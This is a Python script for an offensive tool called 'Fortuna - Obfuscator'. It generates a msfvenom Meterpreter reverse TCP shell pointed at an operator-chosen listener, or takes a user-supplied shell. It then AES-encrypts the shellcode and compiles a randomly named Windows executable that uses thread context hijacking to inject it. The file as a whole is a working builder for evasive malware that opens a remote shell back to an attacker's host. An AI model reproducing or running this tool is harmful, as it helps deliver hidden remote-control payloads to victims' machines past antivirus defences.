import shutil
import pyfiglet
import os
from colorama import Fore
import randomname


def generate_shell():
    print(Fore.WHITE + "[---] Generating reverse TCP shell")
    lhost = input("lhost IP?")
    port = 443

    os.system('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + str(port) + ' -f raw -o shell.bin')
    exists = os.path.isfile("shell.bin")
    if not exists:
        print(Fore.RED + "[---] Error occurred trying to create shell, please verify 'msvenom' is installed")
        exit(0)

    print(Fore.GREEN + "[---] ShellCode was successfully created!")


def move_existing_shell():
    path = input("Insert shell's full path.")
    exists = os.path.isfile(path)
    if not exists:
        print(Fore.RED + "[---] Error occurred trying to find the shell in directory, Verify provided path.")
        move_existing_shell()
    else:
        try:
            shutil.copy(path, os.path.dirname(os.path.realpath(__file__)))
            print(Fore.GREEN + "[---] ShellCode was successfully copied!")

        # If there is any permission issue
        except PermissionError:
            print(Fore.RED + "[---] Error occurred Permission Denied, exiting.")
            exit(0)

        # For other errors
        except:
            print(Fore.RED + "[---] Error occurred while copying file, exiting.")
            exit(0)


def encryptAES():
    print(Fore.WHITE + "[---] Encrypting Shellcode with AES Encryption")

    os.system("python3 AES.py shell.bin")
    exists = os.path.isfile('EXEs/Shhh.cpp')
    if not exists:
        print(Fore.RED + "[---] Error occurred trying to encrypt shellcode")
        exit(0)


def BUILD_thread_context():
    print(Fore.WHITE + "[---] Building executable using Thread Context Hijacking")
    name = randomname.generate('v/programming') + randomname.generate('v/military_navy') + randomname.generate('v/manipulation')
    if os.system('x86_64-w64-mingw32-gcc EXEs/Shhh.cpp -o EXEs/' + name) != 0:
        print(Fore.RED + "[---] An Error occurred while trying to compile!")
        exit(0)

    os.remove('EXEs/Shhh.cpp')
    print(Fore.GREEN + "[+++] SUCCESS!!!")
    print(Fore.GREEN + "[+++] ENCRYPTED! INJECTED! COMPILED!")
    print(Fore.GREEN + "[+++]" + name + ".exe has been created!")


def main():
    # Print title using pyfiglet lib - ASCII ART.
    result = pyfiglet.figlet_format("Fortuna - Obfuscator", font="doh", width = 1200)
    print(result)

    # Main menu.
    print(Fore.WHITE + "[---] 1. Generate msfvenom reverse TCP shell.")
    print(Fore.WHITE + "[---] 2. Insert own shell.")
    choose = input()
    if choose == '1':
        generate_shell()
    if choose == '2':
        move_existing_shell()
    encryptAES()
    BUILD_thread_context()


if __name__ == "__main__":
    main()
